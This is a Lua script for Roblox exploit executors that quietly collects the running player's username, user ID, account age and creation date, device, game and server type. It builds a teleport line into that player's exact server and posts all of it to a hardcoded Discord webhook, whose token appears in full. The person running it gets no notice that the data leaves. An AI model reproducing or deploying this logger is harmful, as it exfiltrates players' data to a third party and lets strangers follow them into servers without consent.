-- Open source so what do you want from it

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")

local request = (syn and syn.request)
    or (http and http.request)
    or http_request
    or request

if not request then
    warn("Your executor does not support HTTP requests.")
    return
end

local player = Players.LocalPlayer
while not player do
    task.wait()
    player = Players.LocalPlayer
end

local webhook_url = "https://discord.com/api/webhooks/1360924471598252152/7G2pKlkqKP8pt8T38G0o0QwKXgZSJD79drX30FJDftep24nCUGGgEbNQ4RuKqILi-ugo"

local function getTimestamp()
    return os.date("!%Y-%m-%dT%H:%M:%SZ")
end

local function getReadablePlatform()
    local rawPlatform = "Unknown"
    pcall(function()
        rawPlatform = UserInputService:GetPlatform().Name
    end)

    local platformMap = {
        Windows = "PC (Windows)",
        MacOS = "Mac",
        IOS = "iOS",
        Android = "Android",
        XboxOne = "Xbox",
        PS4 = "PlayStation",
        Unknown = "Unknown Device"
    }

    return platformMap[rawPlatform] or rawPlatform
end

local accountCreatedDate = "Unknown"
local userInfoResponse = request({
    Url = "https://users.roblox.com/v1/users/" .. player.UserId,
    Method = "GET"
})

if userInfoResponse and userInfoResponse.StatusCode == 200 then
    local userData = HttpService:JSONDecode(userInfoResponse.Body)
    if userData and userData.created then
        local y, m, d = string.match(userData.created, "(%d+)%-(%d+)%-(%d+)")
        if y and m and d then
            accountCreatedDate = string.format("%02d-%02d-%04d", tonumber(m), tonumber(d), tonumber(y))
        end
    end
end

local platform = getReadablePlatform()
local gameName = "Unknown Game"
local placeId = game.PlaceId
local jobId = game.JobId

local success, info = pcall(function()
    return MarketplaceService:GetProductInfo(placeId)
end)

if success and info then
    gameName = info.Name
end

local serverType = game.PrivateServerId ~= "" and "Private Server" or "Public Server"

local joinScript = string.format(
    'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)',
    placeId, jobId
)

local data = {
    ["username"] = "Roblox User",
    ["embeds"] = {{
        ["title"] = "Script Executed",
        ["description"] = "User info has been sent successfully.",
        ["color"] = 65280,
        ["fields"] = {
            { ["name"] = "Username", ["value"] = player.Name, ["inline"] = true },
            { ["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true },
            { ["name"] = "Account Age", ["value"] = tostring(player.AccountAge) .. " Days Old", ["inline"] = true },
            { ["name"] = "Created At", ["value"] = accountCreatedDate, ["inline"] = true },
            { ["name"] = "Device", ["value"] = platform, ["inline"] = true },
            { ["name"] = "Time", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = true },
            { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = false },
            { ["name"] = "Server Type", ["value"] = serverType, ["inline"] = true },
            { ["name"] = "Join Script (Mobile)", ["value"] = joinScript, ["inline"] = false },
            { ["name"] = "Join Script (PC)", ["value"] = "```lua\n" .. joinScript .. "\n```", ["inline"] = false },
            { ["name"] = "Profile", ["value"] = "[View Profile](https://www.roblox.com/users/" .. player.UserId .. "/profile)", ["inline"] = false }
        },
        ["footer"] = { ["text"] = "By mvp_kfc | " .. platform },
        ["timestamp"] = getTimestamp()
    }}
}

local jsonData = HttpService:JSONEncode(data)

request({
    Url = webhook_url,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = jsonData
})
